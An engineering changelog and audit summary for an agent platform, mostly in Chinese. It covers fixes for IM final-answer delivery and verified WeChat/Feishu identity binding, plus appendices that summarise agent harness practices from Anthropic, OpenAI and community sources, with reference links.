cd /Users/example-owner/vc-saas/hiveclaw-main/frontend
npm run build
npm run test
```

当前结果:聚焦 LLM-write-gate/deployment 红线 `8 passed`;memory/team/deployment 相关回归 `46 passed,3 warnings`;extraction/ledger/queue/memory integration `149 passed,3 warnings`;subagent memory/evolution 相关回归 `69 passed,4 warnings`;全量 ruff `All checks passed!`;compileall 通过;后端全量真 PG `4152 passed,7 skipped,4 warnings`;frontend build 通过;Vitest `39 passed` test files / `198 passed` tests。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

## 2026-07-18 durable IM 终态回发与身份闭环

生产取证发现两个共用断点：渠道 handler 把“已接收，正在后台处理”平台 ACK 写成 `assistant` 历史，导致 ACK 进入后续模型请求；Session V2 canonical terminal commit 虽将任务和结果原子化提交，却没有同时创建 `channel_delivery_outbox`，因此微信、Feishu/Lark 及其他 durable IM 只能收到接收回执，收不到最终答案。两个生产 run 均已完成，其中一个已有 3137 字终答但 outbox 为零，另一个模型请求明确包含 ACK 并将其逐字提交为 terminal candidate。

修复后的机械契约如下：

- 所有 durable IM 接收回执使用 typed `ChannelTransportReceipt`，只允许发给 provider，不得写入模型可见的 `ChatMessage(role="assistant")`；Slack/Feishu 文件接收 ACK 同样不进入 assistant 历史。
- `commit_terminal_outcome` 在同一数据库事务内根据 `ChatSession.delivery_target_json` 创建 immutable、deterministic、幂等的 terminal delivery intent；正常提交、sealed outcome 恢复、terminal candidate 恢复和已提交 outcome 的显式重放均复用同一入口。
- 外部 sender authority 使用 `(tenant, provider, installation, subject)` principal，并把 `principal_type` 带入 Session command、event actor、恢复与 dispatch；微信连接成功即验证并落 `self_identity_user_id`，Feishu/Lark 扫码注册创建并验证 app/channel 配置。
- 生产路径验收覆盖 WeChat Personal、Feishu/Lark、WeCom、Slack、Teams、Telegram、Discord、DingTalk；outbox 唯一约束保证同一 run/target/kind exactly-once，provider 发送仍由可重试 outbox worker 承担。

本轮 Red 证据为 4 个聚焦回归同时失败（typed ACK helper 缺失、九个 IM handler 未隔离 ACK、normal terminal outbox 为零、recovery terminal outbox 为零）。Green 证据：后端相关矩阵 `294 passed`，完整 `test_web_chat_runtime.py` `117 passed`，前端渠道扫码/配置 `12 passed`，`tsc + vite build + AgentDetail bundle budget` 全部通过。

## 2026-07-19 IM 用户自证与 Feishu/Lark 二维码线上修订

生产 Agent Detail 扫码失败的直接原因是本地 allowlist 只接受 `accounts.feishu.cn` / `accounts.larksuite.com`，而官方 `lark-oapi==1.7.1` 注册 SDK 实际返回 `open.feishu.cn` / `open.larksuite.com` 的二维码 URL。身份断点更深：Feishu inbound 会根据 sender profile 自动创建/填充平台 User，公司后台还能把任意 ExternalPrincipal 指定给任意 member，两条路径都没有 provider 证明“这个 IM subject 就是这个 Hive User”。

修订后的机械契约：

- WeChat Personal 与 Feishu/Lark 只能在已认证的 Agent Detail QR connect callback 中完成用户自绑；provider scanner subject、当前 Hive User、Agent manage authority、ChannelConfig 和加密凭证在同一事务中落库。
- `external_principals` 新增 `binding_method` / `binding_verified_at`，数据库约束强制 `wechat_personal↔wechat_qr` 和 `feishu↔feishu_qr` 精确匹配；没有 proof 的 `linked_user_id` 无法写入。
- tenant admin 的 link API、前端 member 选择器和 service 公开 link 入口已删除；管理员只能 unlink。unlink 会同事务清除 session/message User 投影，停止 WeChat/Feishu transport，并让 Agent Detail 明确显示“需要重新绑定”。
- Feishu text/file/card 入站统一消费 installation-scoped ExternalPrincipal，不再根据 email/org profile 制造 User；group session 增加 sender subject 维度，避免群内多人共用一个 User authority。
- migration 只保留具有 `identity_source=authenticated_channel_connect` provenance 的旧 WeChat QR 绑定；不信任上一版可能由管理员指定反推出的 self-identity 投影。所有无 proof 绑定都会保留 audit event 后解除；旧 Feishu/Lark 配置转为 `identity_rebind_required`，需要用户回到 Agent Detail 重新扫码。
- 首次生产迁移后的只读验收进一步发现：旧 WeChat config 可能从未有过 self-identity 投影却仍把 transport 标为 connected。后续 migration `im_unverified_transport_0719` 对所有不存在精确 `wechat_personal↔wechat_qr` principal proof 的配置统一设置 `is_connected=false` 与 `identity_rebind_required`；startup manager 同时只枚举带同 installation proof 的配置，防止 schema 漂移或旧数据再次启动假连接。

验收证据：官方 `open.feishu.cn` / `open.larksuite.com` QR host 回归、scanner `open_id` 缺失 fail-closed、用户自绑/管理员仅解绑、Feishu text/file/group/card authority、session/message 同步、provider-proof 数据库约束、parent→head migration 和前端管理面均有可执行回归；Ruff、Alembic 单 head、TypeScript/Vite build 和 AgentDetail bundle budget 通过。

---

## 附录 A:基准控制元素精要(三方研究全文另存,此处录审计实际引用项)

**Anthropic**:agent loop 四步;Stop hook 续跑(exit 2 喂 stderr 继续干);auto-compact ~83.5% 触发+压缩幸存物白名单(CLAUDE.md/rules/auto memory 重注入,skill 单 5K/总 25K);API context editing(`clear_tool_uses` 默认 input>100K 保最近 3 个);服务端 compaction beta(150K 触发);subagent 摘要回传 1-2K tokens 契约;权限 deny→ask→allow 固定序+OS 沙箱(84% 弹窗削减)+auto mode 分类器(误杀 0.4%/漏放 17% 自报);checkpoints 每 prompt 自动+/rewind 三态恢复;hooks 30 事件;Agent Teams 共享任务表+mailbox+TeammateIdle 质量门;Managed Agents(harness-as-a-service:outcome rubric 迭代/memory store/cron);「成本实证:裸跑 20min/$9 vs 全 harness 6h/$200」。

**OpenAI**:harness 四部分结构(loop/Thread 持久化/Config/工具+策略);「Humans steer. Agents execute.」(5 个月 100 万行/1500 PR/人均 3.5 PR/天/单 run 6h+);compaction 训练进权重(Codex-Max 跨窗自动压缩「repeats until the task is completed」,>24h);sandbox_mode 三档+approval_policy 四档(模型可自带 justification 申请脱沙箱)+network 默认断;AGENTS.md = ~100 行地图非手册(progressive disclosure);Temporal 集成 = 每次 agent 调用一个 Activity(crash 续跑/rate-limit 自动等待);tracing 默认开 Trace→Span;guardrails input 跑首 agent/output 跑末 agent;「机械强制>文档」(linter 错误消息内写修复指引注入 agent 上下文)。

**社区**:Agent=Model+Harness;Guides+Sensors 双面;12-factor(own context window/统一执行态与业务态/launch-pause-resume API/用 tool call 联系人类);长任务 TOP:状态外置+append-only 重放、KV-cache 稳定前缀纪律(10 倍成本差)、文件系统外部记忆+压缩可恢复、recitation 对抗目标漂移、外部验证判停禁自评、跨会话交接文件、保留错误上下文、细粒度检查点+interrupt 一等、单线程优先、防 few-shot 僵化、组件标注补偿缺陷定期删、预算压力显式注入;企业五件套 = 身份/生命周期/权限/预算/审计+执行点强制+append-only;隔离基线上移 microVM。

## 附录 B:引用清单(可复核 URL 节选)

本文不要求读者相信二手转述。至少以下一手或准一手来源可直接复核本文采用的 harness 尺子:

**Anthropic / Claude**
- Demystifying evals for AI agents: <https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents>
- Effective harnesses for long-running agents: <https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents>
- Harness design for long-running application development: <https://www.anthropic.com/engineering/harness-design-long-running-apps>
- Scaling Managed Agents: <https://www.anthropic.com/engineering/managed-agents>
- Building agents with the Claude Agent SDK: <https://www.anthropic.com/engineering/building-agents-with-the-claude-agent-sdk>

**OpenAI**
- Agents SDK guide: <https://developers.openai.com/api/docs/guides/agents>
- Running agents: <https://developers.openai.com/api/docs/guides/agents/running-agents>
- Guardrails and human review: <https://developers.openai.com/api/docs/guides/agents/guardrails-approvals>
- Orchestration and handoffs: <https://developers.openai.com/api/docs/guides/agents/orchestration>
- Integrations and observability: <https://developers.openai.com/api/docs/guides/agents/integrations-observability>
- New tools for building agents: <https://openai.com/index/new-tools-for-building-agents/>

**社区 / runtime 实践**
- LangGraph overview: <https://docs.langchain.com/oss/python/langgraph/overview>
- LangGraph persistence: <https://docs.langchain.com/oss/python/langgraph/persistence>
- LangGraph interrupts: <https://docs.langchain.com/oss/python/langgraph/interrupts>
- LangGraph checkpointers: <https://docs.langchain.com/oss/javascript/langgraph/checkpointers>
- LangGraph / Deep Agents production note: <https://docs.langchain.com/oss/python/deepagents/going-to-production>

---

*审计执行:2026-06-11,9 路并行(3 外部基准 + 6 内部分区),主审对 6 个分区各抽 1 条最高严重度 P0 亲读代码复核,6/6 属实。各分区完整报告(含全部 P1/P2 与逐镜头对照表)存于审计会话记录。*
